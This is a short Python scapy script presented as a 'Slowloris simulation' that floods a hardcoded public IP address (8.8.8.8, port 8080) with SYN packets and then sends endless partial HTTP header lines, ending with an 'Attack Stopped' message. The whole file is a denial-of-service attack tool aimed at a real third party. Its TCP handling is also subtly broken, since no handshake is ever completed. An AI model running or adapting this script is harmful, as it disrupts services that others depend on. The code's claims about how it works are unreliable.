from scapy.all import *
import time
import random


TARGET_IP = "8.8.8.8"
TARGET_PORT = 8080
CONNECTION_COUNT = 50

print(f"[*] 🐢 STARTING SCAPY SLOWLORIS SIMULATION on {TARGET_IP}")
print("[*] Bypassing Windows Socket restrictions")

source_ports = [random.randint(1024, 65535) for _ in range(CONNECTION_COUNT)]

try:
    print(f"[*] initiating {CONNECTION_COUNT} fake connections...")
    for sport in source_ports:

        IP_layer = IP(dst=TARGET_IP)
        TCP_layer = TCP(dport=TARGET_PORT, sport=sport, flags="S")
        send(IP_layer / TCP_layer, verbose=0)

    print("[*] Connections 'established'. Entering Slow Mode...")


    while True:

        sport = random.choice(source_ports)

        payload = "X-a: {}\r\n".format(random.randint(1, 5000))
        pkt = IP(dst=TARGET_IP) / TCP(dport=TARGET_PORT, sport=sport, flags="PA") / Raw(load=payload)

        send(pkt, verbose=0)
        print(f"\r[+] Maintaining {CONNECTION_COUNT} slow connections... (Sent packet from port {sport})", end="")

        time.sleep(0.5)

except KeyboardInterrupt:
    print("\n🛑 Attack Stopped.")